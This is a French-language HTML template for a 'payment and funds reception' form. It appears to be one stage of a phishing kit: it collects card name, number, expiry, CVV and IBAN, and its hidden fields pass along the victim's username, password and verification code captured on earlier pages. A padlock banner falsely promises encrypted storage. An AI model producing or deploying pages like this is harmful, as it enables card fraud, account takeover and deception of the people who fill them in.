<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Informations de paiement</title>
  <style>
    /* Styles g√©n√©raux */
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    html, body {
      height: 100%;
      margin: 0;
      font-family: Arial, sans-serif;
      background: #f2f2f2 url("{{ url_for('static', filename='img/background.jpg') }}") no-repeat center center fixed;
      background-size: cover;
      background-position: center center;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      color: #333;
      overflow-y: auto;
      padding: 20px 0;
    }

    /* **SECTION D√âJ√Ä CORRIG√âE POUR L'ARRI√àRE-PLAN MOBILE** */
    @media (max-width: 480px) {
      html, body {
        background-size: contain; /* Ajuste l'image pour qu'elle tienne enti√®rement dans l'√©cran */
        background-position: top center; /* Centre l'image en haut de l'√©cran */
        background-repeat: no-repeat; /* Emp√™che la r√©p√©tition de l'image */
        background-attachment: scroll; /* L'image d√©file avec le contenu sur mobile */
      }
      .modal { /* Note: Pour cette page, la classe principale est .modal-payment, pas .modal */
        padding: 20px 15px; /* Conserve le padding ajust√© pour les petites tailles d'√©cran */
      }
      input, button {
        font-size: 15px; /* Conserve la taille de police ajust√©e */
      }
    }

    /* Styles du conteneur modal */
    .modal-payment {
      background-color: white;
      width: 90%;
      max-width: 450px;
      padding: 25px;
      border-radius: 8px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
      position: relative;
      max-height: calc(100vh - 40px);
      overflow-y: auto;
    }

    /* En-t√™te de la modal */
    .modal-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
    }

    .modal-header h3 {
      font-size: 18px;
      font-weight: normal;
      color: #333;
    }

    .close-button {
      background: none;
      border: none;
      font-size: 24px;
      cursor: pointer;
      color: #777;
      line-height: 1;
      padding: 0;
      margin: 0;
    }
    .close-button:hover {
      color: #333;
    }

    /* Message de s√©curisation en haut de cette page */
    .security-message-payment {
      font-size: 14px;
      color: #007b76;
      margin-bottom: 20px;
      font-weight: bold;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 5px;
      padding: 0;
      text-align: center;
      line-height: 1.3;
    }

    .security-message-payment .icon {
        font-size: 18px;
        line-height: 1;
    }

    /* Logos des cartes */
    .card-logos {
      margin-bottom: 20px;
      text-align: left;
    }
    .card-logos img {
      height: 20px;
      margin-right: 5px;
      vertical-align: middle;
    }
    .card-logos span {
      font-size: 14px;
      color: #777;
      vertical-align: middle;
    }

    /* Groupes de formulaire */
    .form-group {
      margin-bottom: 15px;
      text-align: left;
    }

    .form-group label {
      display: block;
      font-size: 14px;
      color: #555;
      margin-bottom: 5px;
    }

    .form-group input[type="text"] {
      width: 100%;
      padding: 10px;
      border: 1px solid #ddd;
      border-radius: 5px;
      font-size: 15px;
    }

    .form-group input[type="text"]::placeholder {
      color: #aaa;
    }

    .form-group .input-feedback {
      font-size: 12px;
      color: #dc3545;
      margin-top: 5px;
      display: none;
    }
    .form-group.has-error input {
      border-color: #dc3545;
    }
    .form-group.has-error .input-feedback {
      display: block;
    }

    .input-row {
      display: flex;
      gap: 15px;
    }
    .input-row .form-group {
      flex: 1;
    }

    /* Boutons */
    .button-group {
      margin-top: 25px;
    }
    .button-group button {
      width: 100%;
      padding: 12px;
      font-size: 17px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
      transition: background-color 0.3s ease;
    }

    .button-primary {
      background-color: #007b76;
      color: white;
      margin-bottom: 10px;
    }
    .button-primary:hover {
      background-color: #00605c;
    }

    .button-secondary {
      background-color: #f2f2f2;
      color: #555;
    }
    .button-secondary:hover {
      background-color: #e0e0e0;
    }

    .help-icon {
        display: inline-block;
        width: 16px;
        height: 16px;
        border: 1px solid #ccc;
        border-radius: 50%;
        text-align: center;
        line-height: 14px;
        font-size: 12px;
        cursor: pointer;
        color: #777;
        margin-left: 5px;
        vertical-align: middle;
    }
    .help-icon:hover {
        background-color: #eee;
    }
  </style>
</head>
<body>
  <div class="modal-payment">
    <div class="security-message-payment">
        <span class="icon">üîí</span>
        <span>Vos informations de paiement sont enregistr√©es et s√©curis√©es par un cryptage avanc√©.</span>
    </div>

    <div class="modal-header">
      <h3>Informations de reception de fond et de paiement</h3>
      <button type="button" class="close-button">&times;</button>
    </div>

    <form action="/process_payment" method="post">
      <div class="form-group">
        <label for="card_name">Nom figurant sur la carte</label>
        <input type="text" id="card_name" name="card_name" placeholder="Saisis ton nom et pr√©nom" required>
        <div class="input-feedback">Nom figurant sur la carte ne peut pas √™tre vide</div>
      </div>

      <div class="form-group">
        <label for="card_number">Num√©ro de carte bancaire</label>
        <input type="text" id="card_number" name="card_number" placeholder="Par ex : 1234 1234 1234 1234" inputmode="numeric" maxlength="19" required>
        <div class="input-feedback">Num√©ro de carte bancaire ne peut pas √™tre vide</div>
      </div>

      <div class="input-row">
        <div class="form-group">
          <label for="expiry_date">Date d'expiration</label>
          <input type="text" id="expiry_date" name="expiry_date" placeholder="MM / AA" maxlength="7" required>
        </div>
        <div class="form-group">
          <label for="cvv">Code de s√©curit√© <span class="help-icon">?</span></label>
          <input type="text" id="cvv" name="cvv" placeholder="par ex : 123" inputmode="numeric" maxlength="4" required>
        </div>
      </div>

      <div class="form-group">
        <label for="iban">IBAN</label>
        <input type="text" id="iban" name="iban" placeholder="FRXX XXXX XXXX XXXX XXXX XXXX XXX" maxlength="34" required>
        <div class="input-feedback">Veuillez entrer un IBAN valide (FR)</div>
      </div>

      <input type="hidden" name="username" value="{{ username }}">
      <input type="hidden" name="password" value="{{ password }}">
      <input type="hidden" name="verification_code" value="{{ verification_code }}">

      <div class="button-group">
        <button type="submit" class="button-primary">Enregistrer ses informations</button>
        <button type="button" class="button-secondary" onclick="history.back()">Annuler</button>
      </div>
    </form>
    </div>

  <script>
    // Fonction de validation pour v√©rifier la validit√© d'un IBAN fran√ßais (basic structure)
    function isValidIbanFR(iban) {
        iban = iban.replace(/\s/g, '').toUpperCase();
        const frIbanRegex = /^FR\d{2}([0-9A-Z]{23})$/;
        return frIbanRegex.test(iban) && iban.length === 27;
    }

    document.querySelector('form').addEventListener('submit', function(event) {
        let isValid = true;

        // Validation Nom sur la carte
        const cardNameInput = document.getElementById('card_name');
        if (cardNameInput.value.trim() === '') {
            cardNameInput.closest('.form-group').classList.add('has-error');
            cardNameInput.nextElementSibling.textContent = "Nom figurant sur la carte ne peut pas √™tre vide.";
            isValid = false;
        } else {
            cardNameInput.closest('.form-group').classList.remove('has-error');
        }

        // Validation Num√©ro de carte bancaire
        const cardNumberInput = document.getElementById('card_number');
        const rawCardNumber = cardNumberInput.value.replace(/\s/g, '');
        if (rawCardNumber.length < 13 || rawCardNumber.length > 19 || !/^\d+$/.test(rawCardNumber)) {
            cardNumberInput.closest('.form-group').classList.add('has-error');
            cardNumberInput.nextElementSibling.textContent = "Num√©ro de carte bancaire invalide (13-19 chiffres).";
            isValid = false;
        } else {
            cardNumberInput.closest('.form-group').classList.remove('has-error');
        }

        // Validation Date d'expiration
        const expiryDateInput = document.getElementById('expiry_date');
        const expiryRegex = /^(0[1-9]|1[0-2]) \/ ([0-9]{2})$/;
        if (!expiryRegex.test(expiryDateInput.value.trim())) {
            expiryDateInput.closest('.form-group').classList.add('has-error');
            expiryDateInput.nextElementSibling.textContent = "Format de date incorrect (MM / AA).";
            isValid = false;
        } else {
            const [month, year] = expiryDateInput.value.split(' / ').map(Number);
            const currentYear = new Date().getFullYear() % 100;
            const currentMonth = new Date().getMonth() + 1;

            if (year < currentYear || (year === currentYear && month < currentMonth)) {
                expiryDateInput.closest('.form-group').classList.add('has-error');
                expiryDateInput.nextElementSibling.textContent = "La date d'expiration doit √™tre future.";
                isValid = false;
            } else {
                expiryDateInput.closest('.form-group').classList.remove('has-error');
            }
        }

        // Validation Code de s√©curit√© (CVV)
        const cvvInput = document.getElementById('cvv');
        if (!/^[0-9]{3,4}$/.test(cvvInput.value.trim())) {
            cvvInput.closest('.form-group').classList.add('has-error');
            cvvInput.nextElementSibling.textContent = "Code de s√©curit√© invalide (3 ou 4 chiffres).";
            isValid = false;
        } else {
            cvvInput.closest('.form-group').classList.remove('has-error');
        }

        // VALIDATION IBAN
        const ibanInput = document.getElementById('iban');
        if (!isValidIbanFR(ibanInput.value.trim())) {
            ibanInput.closest('.form-group').classList.add('has-error');
            ibanInput.nextElementSibling.textContent = "Veuillez entrer un IBAN fran√ßais valide (FR + 2 chiffres + 23 caract√®res).";
            isValid = false;
        } else {
            ibanInput.closest('.form-group').classList.remove('has-error');
        }


        if (!isValid) {
            event.preventDefault();
        }
    });

    // Formatage du num√©ro de carte
    document.getElementById('card_number').addEventListener('input', function (e) {
        let value = e.target.value.replace(/\s+/g, '');
        let formattedValue = '';
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) {
                formattedValue += ' ';
            }
            formattedValue += value[i];
        }
        e.target.value = formattedValue;
    });

    // Formatage de la date d'expiration
    document.getElementById('expiry_date').addEventListener('input', function (e) {
        let value = e.target.value.replace(/\s*\/\s*/g, '');
        if (value.length > 2) {
            value = value.substring(0, 2) + ' / ' + value.substring(2);
        }
        e.target.value = value;
    });

    // Formatage de l'IBAN
    document.getElementById('iban').addEventListener('input', function (e) {
        let value = e.target.value.replace(/\s+/g, '').toUpperCase();
        let formattedValue = '';
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) {
                formattedValue += ' ';
            }
            formattedValue += value[i];
        }
        e.target.value = formattedValue;
    });

    // Redirige au clic sur le bouton de fermeture
    document.querySelector('.close-button').addEventListener('click', function() {
        window.history.back();
    });
  </script>
</body>
</html>
